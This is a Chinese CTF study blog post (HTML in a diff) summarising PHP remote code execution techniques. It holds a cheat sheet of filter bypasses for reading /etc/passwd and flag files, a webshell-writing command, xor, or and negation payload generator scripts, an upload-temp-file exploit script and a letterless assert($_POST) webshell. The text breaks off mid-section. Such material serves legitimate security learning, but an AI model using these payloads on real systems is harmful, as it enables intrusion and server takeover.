@@ -1,0 +1,771 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>rce考点总结 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">rce考点总结</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/">2022-11-21</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻博客不需要再去找那么多的文章，此外也希望对以后社团的学弟学妹有些帮助，这些文章的内容只有一部分为我自己写的，很多是搬运师傅的文章，因为很多师傅的文章写的已经十分完美，特别是p神，很多年前发表的东西现在仍不过时。我所做的主要是把文章整合在一起，对漏洞的考点有更加全面的认识！</p>
+<h1 id="什么是rce"><a href="#什么是rce" class="headerlink" title="什么是rce"></a>什么是rce</h1><p>什么是rce?</p>
+<p>既远程代码/命令执行，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p>
+<p>命令执行：直接执行我们输入的恶意命令</p>
+<p>代码执行：直接执行我们所输入的恶意代码</p>
+<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p>
+<p><strong>定义：</strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
+<p><strong>永远不要相信用户的输入！</strong></p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p> 继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p>
+<h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><pre><code>system()  输出并返回最后一行shell结果
+exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面
+shell_exec()  通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回
+passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上（替换system）
+</code></pre>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><pre><code>eval()函数:用来执行一个字符串表达式，并返回表达式的值
+assert()函数:在php语言中是用来判断一个表达式是否成立,返回true or false,但是字符串参数会被执行
+</code></pre>
+<h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>我们需要注意，当我们正常输入的时候，在大多数情况下是不会触发这一漏洞的，我们需要一些小tips。</p>
+<p>常见技巧：</p>
+<pre><code class="php">一、常见管道符：
+‘|’ 直接执行后面的语句
+‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
+‘&amp;’ 前面和后面命令都要执行，无论前面真假
+&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令
+Linux:
+Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同
+</code></pre>
+<pre><code class="php">二、空格绕过(空格被过滤)：
+&lt;  --  重定向，如cat&lt;flag.php
+&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php
+%09  --  需要php环境，如cat%09flag.php
+$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php
+$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php
+</code></pre>
+<pre><code class="php">三、黑名单绕过
+1、拼接
+a=c;b=at;c=flag;$a$b $c
+a=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;
+2、base64编码
+echo MTIzCg==|base64 -d 其将会打印123
+echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flag
+echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh ==&gt;cat /flag
+3、hex编码
+echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag
+4、单引号、双引号,反单引号绕过
+ca&#39;&#39;t flag 或ca&quot;&quot;t flag
+ca&#39;&#39;t te&quot;&quot;st.php
+c``a``t /etc/passwd
+5、反斜杠绕过
+ca\t fl\ag
+cat te\st.php
+6、绕过ip中的句点
+网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。
+可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。
+在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP
+7、利用oct编码（八进制）绕过
+$(printf &quot;\154\163&quot;)  //ls命令
+$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag
+&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag
+#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;
+$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php
+在线转换网站:https://photo333.com/text-to-octal-zh.php
+8、&#39;/&#39;被过滤绕过
+可利用&#39;;&#39;拼接命令绕过
+cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd (也可以利用第七步的八进制绕过)
+9、通配符绕过
+列如cat /passwd：
+??? /e??/?a????
+cat /e*/pa*
+10、利用未初始化变量$u绕过
+cat$u /etc/passwd
+cat /etc$u/passwd
+11、glob通配符
+cat t[a-z]st
+cat t&#123;a,b,c,d,e,f&#125;st
+12、利用PATH绕过
+可以通过截断和拼接来得到我们想要的来getshell
+$&#123;PATH:5:1&#125; //l
+$&#123;PATH:2:1&#125; //s
+$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令
+$&#123;PATH:5:1&#125;s //拼接后是ls,执行命令
+</code></pre>
+<pre><code class="php">四、绕过长度限制
+1，通过&gt;来创建文件
+&gt;flag.txt
+2，通过&gt;将命令结果存入文件中
+echo &quot;hello hacker&quot; &gt; flag.txt
+3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容
+echo &quot;hello hacker&quot; &gt;&gt; flag.txt
+4、Linux中命令换行
+在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。
+比如：cat flag
+ca\
+t\
+ fla\
+g.txt
+将命令一条一条输入一个文本中再执行:
+root@kali:~# echo &quot;ca\\&quot;&gt;cmd
+root@kali:~# echo &quot;t\\&quot;&gt;&gt;cmd
+root@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmd
+root@kali:~# echo &quot;ag&quot;&gt;&gt;cmd
+root@kali:~# cat cmd
+ca\
+t\
+ fl\
+ag
+root@kali:~# sh cmd
+this is your flag
+</code></pre>
+<pre><code class="php">五、各种读文件命令
+cat--由第一行开始显示内容，并将所有内容输出
+tac--从最后一行倒序显示内容，并将所有内容输出
+more-- 根据窗口大小，一页一页的现实文件内容
+less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
+head-- 只显示头几行
+tail --只显示最后几行
+nl --类似于cat -n，显示时输出行号
+tailf-- 类似于tail -f
+vim --使用vim工具打开文本
+vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出
+</code></pre>
+<p>上面介绍的这些方法可以解决大部分ctf题目，但是我们会经常遇到更加严苛的过滤，我们就要介绍接下来的一些题目类型和解决方法</p>
+<h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>我们以一道经典的题目为例:</p>
+<p>[极客大挑战 2019]RCE ME</p>
+<p>题目代码:</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if(isset($_GET[&#39;code&#39;]))&#123;
+            $code=$_GET[&#39;code&#39;];
+                    if(strlen($code)&gt;40)&#123;
+                                        die(&quot;This is too Long.&quot;);
+                                                &#125;
+                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;
+                                        die(&quot;NO.&quot;);
+                                                &#125;
+                    @eval($code);
+&#125;
+else&#123;
+            highlight_file(__FILE__);
+&#125;
+
+// ?&gt;
+</code></pre>
+<h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p>php7</p>
+<p>脚本:</p>
+<pre><code class="php">&lt;?php
+//在命令行中运行
+
+/*author yu22x*/
+
+fwrite(STDOUT,&#39;[+]your function: &#39;);
+
+$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 
+
+fwrite(STDOUT,&#39;[+]your command: &#39;);
+
+$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN)); 
+
+echo &#39;[*] (~&#39;.urlencode(~$system).&#39;)(~&#39;.urlencode(~$command).&#39;);&#39;;
+</code></pre>
+<p>脚本使用的时候注意有些()不可以一起转进去，我们先来测试一下</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200544538.png" alt="image-20221121200544538"></p>
+<pre><code class="php">http://127.0.0.1/index.php?code=(~%8f%97%8f%96%91%99%90)(); //我们不需要参数只是测试，把后面的取反符号去掉即可
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121191347692.png" alt="image-20221121191347692"></p>
+<p>我们现在来构造可以执行命令的字符串</p>
+<pre><code class="php">http://480abdfe-af61-4f9a-bfdf-2e0227fda03b.node4.buuoj.cn:81/?code=(~%8c%86%8c%8b%9a%92)(~%93%8c); //system(&#39;ls&#39;)
+</code></pre>
+<p>按理说没问题的哦，我本地是可以的，不过在buu没有执行成功，不过问题不大，还有很多种方法</p>
+<p>这题可以通过:</p>
+<pre><code class="php">assert(eval($_POST[sakura]))
+</code></pre>
+<p>还是利用取反构造</p>
+<pre><code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%9E%94%8A%8D%9E%A2%D6);
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121200843416.png" alt="image-20221121200843416"></p>
+<p>这里尝试执行命令，同样没反应，那么这题应该是没有回显的，但是我们可以使用蚁剑去连接!</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121194931677.png" alt="image-20221121194931677"></p>
+<p>这题到这里并没有结束，不过后面并不是我们需要关注的重点，我们就先忽略吧！</p>
+<h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p>php7</p>
+<p>由于buu的题目无回显，我们直接把源码搭建在本地进行测试:</p>
+<p>给出两个脚本:</p>
+<p>yihuo.php</p>
+<pre><code class="php">&lt;?php
+
+/*author yu22x*/
+
+$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);
+$contents=&quot;&quot;;
+for ($i=0; $i &lt; 256; $i++) &#123; 
+    for ($j=0; $j &lt;256 ; $j++) &#123; 
+
+        if($i&lt;16)&#123;
+            $hex_i=&#39;0&#39;.dechex($i);
+        &#125;
+        else&#123;
+            $hex_i=dechex($i);
+        &#125;
+        if($j&lt;16)&#123;
+            $hex_j=&#39;0&#39;.dechex($j);
+        &#125;
+        else&#123;
+            $hex_j=dechex($j);
+        &#125;
+        $preg = &#39;/[a-z0-9]/i&#39;; //根据题目给的正则表达式修改即可
+        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+                    echo &quot;&quot;;
+    &#125;
+  
+        else&#123;
+        $a=&#39;%&#39;.$hex_i;
+        $b=&#39;%&#39;.$hex_j;
+        $c=(urldecode($a)^urldecode($b));
+        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;
+            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+        &#125;
+    &#125;
+
+&#125;
+&#125;
+fwrite($myfile,$contents);
+fclose($myfile);
+</code></pre>
+<p>yihuo.py</p>
+<pre><code class="python"># -*- coding: utf-8 -*-
+
+# author yu22x
+
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=&quot;&quot;
+   s2=&quot;&quot;
+   for i in arg:
+       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)
+       while True:
+           t=f.readline()
+           if t==&quot;&quot;:
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;^\&quot;&quot;+s2+&quot;\&quot;)&quot;
+   return(output)
+   
+while True:
+   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;
+   print(param)
+</code></pre>
+<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br> 接着运行python脚本即可。<br> 运行结果</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201209130.png" alt="image-20221121201209130"></p>
+<pre><code>(&quot;%0b%08%0b%09%0e%06%0f&quot;^&quot;%7b%60%7b%60%60%60%60&quot;)();  //phpinfo()
+(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;); //system(whoami)
+(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);  //system(ls)
+(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%0c%01%07&quot;^&quot;%60%60%7c%20%2f%60%60%60%60&quot;); //system(cat /flag)
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121201250221.png" alt="image-20221121201250221"></p>
+<h2 id="二进制或绕过"><a href="#二进制或绕过" class="headerlink" title="二进制或绕过"></a>二进制或绕过</h2><p>php7</p>
+<p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
+<p>or.php</p>
+<pre><code class="php">&lt;?php
+
+/* author yu22x */
+
+$myfile = fopen(&quot;or_rce.txt&quot;, &quot;w&quot;);
+$contents=&quot;&quot;;
+for ($i=0; $i &lt; 256; $i++) &#123; 
+    for ($j=0; $j &lt;256 ; $j++) &#123; 
+
+        if($i&lt;16)&#123;
+            $hex_i=&#39;0&#39;.dechex($i);
+        &#125;
+        else&#123;
+            $hex_i=dechex($i);
+        &#125;
+        if($j&lt;16)&#123;
+            $hex_j=&#39;0&#39;.dechex($j);
+        &#125;
+        else&#123;
+            $hex_j=dechex($j);
+        &#125;
+        $preg = &#39;/[0-9a-z]/i&#39;;//根据题目给的正则表达式修改即可
+        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+                    echo &quot;&quot;;
+    &#125;
+  
+        else&#123;
+        $a=&#39;%&#39;.$hex_i;
+        $b=&#39;%&#39;.$hex_j;
+        $c=(urldecode($a)|urldecode($b));
+        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;
+            $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+        &#125;
+    &#125;
+
+&#125;
+&#125;
+fwrite($myfile,$contents);
+fclose($myfile);
+</code></pre>
+<p>or.py</p>
+<pre><code class="python"># -*- coding: utf-8 -*-
+
+# author yu22x
+
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=&quot;&quot;
+   s2=&quot;&quot;
+   for i in arg:
+       f=open(&quot;or_rce.txt&quot;,&quot;r&quot;)
+       while True:
+           t=f.readline()
+           if t==&quot;&quot;:
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output=&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
+   return(output)
+   
+while True:
+   param=action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;
+   print(param)
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121203834452.png" alt="image-20221121203834452"></p>
+<pre><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)();  //phpinfo()
+(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%17%08%0f%01%0d%09&quot;|&quot;%60%60%60%60%60%60&quot;);  //system(whoami)
+(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;|&quot;%60%60&quot;);   //system(ls)
+(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%0c%01%07&quot;|&quot;%60%60%60%20%2f%60%60%60%60&quot;); //cat /flag
+</code></pre>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121204056924.png" alt="image-20221121204056924"></p>
+<h2 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h2><p><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</p>
+<p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p>
+<p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p>
+<p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p>
+<ul>
+<li><code>*</code>可以代替0个及以上任意字符</li>
+<li><code>?</code>可以代表1个任意字符</li>
+</ul>
+<p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p>
+<p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/19ba62d6-9f8a-40a6-a3f9-833deca218d5.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png" alt="image.png"></a></p>
+<p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="image.png"></a></p>
+<p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>
+<p>思路又陷入了僵局，虽然方向没错。</p>
+<p><strong>深入理解glob通配符</strong></p>
+<p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读Linux的文档（ <a target="_blank" rel="noopener" href="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p>
+<p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></a></p>
+<p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png" alt="image.png"></a></p>
+<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>
+<p>继续阅读glob的帮助，我发现另一个有趣的用法：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png" alt="image.png"></a></p>
+<p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p>
+<p>我们再来看看之前列出可能干扰我们的文件：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/ee9e5ae9-3937-46a3-8d8e-1f4879913801.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/ee9e5ae9-3937-46a3-8d8e-1f4879913801.f9e468b3ba6e.png" alt="image.png"></a></p>
+<p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p>
+<p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/a827f363-7520-4fe9-aac1-b8ceba21a1f3.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/a827f363-7520-4fe9-aac1-b8ceba21a1f3.5be5b8cfbacc.png" alt="image.png"></a></p>
+<p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/42774646-968e-4e11-b6fa-5d4e83eb3c4c.png"><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/42774646-968e-4e11-b6fa-5d4e83eb3c4c.99f26e97fa8a.png" alt="image.png"></a></p>
+<p>显然这一招是管用的。</p>
+<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p>
+<p>最后，我传入的code为<code>?&gt;&lt;?=</code>. /???/????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121212607216.png" alt="image-20221121212607216"></p>
+<p>可写一个脚本:</p>
+<pre><code class="python">#coding:utf-8
+#author yu22x
+import requests
+url=&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;
+files=&#123;&#39;file&#39;:&#39;cat f*&#39;&#125;
+response=requests.post(url,files=files)
+html = response.text
+print(html)
+</code></pre>
+<h2 id="构造无数字字母webshell"><a href="#构造无数字字母webshell" class="headerlink" title="构造无数字字母webshell"></a>构造无数字字母webshell</h2><p>环境:php5</p>
+<p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p>
+<p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p>
+<p>下文为了方便起见，使用PHP5作为环境</p>
+<h3 id="异或webshell"><a href="#异或webshell" class="headerlink" title="异或webshell"></a>异或webshell</h3><p>这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
+<p>得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：</p>
+<pre><code class="php">&lt;?php
+$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=&#39;assert&#39;;
+$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=&#39;_POST&#39;;
+$___=$$__;
+$_($___[_]); // assert($_POST[_]);
+</code></pre>
+<p>传入代码:</p>
+<pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;);$___=$$__;$_($___[_]);
+</code></pre>
+<p>执行结果如下：</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214114436.png" alt="image-20221121214114436"></p>
+<h3 id="取反webshell"><a href="#取反webshell" class="headerlink" title="取反webshell"></a>取反webshell</h3><p>用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>&#39;和&#39;&#123;2&#125;</code>的结果是<code>&quot;\x8c&quot;</code>，其取反即为字母<code>s</code>：</p>
+<p><img src="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/image-20221121214447649.png" alt="image-20221121214447649"></p>
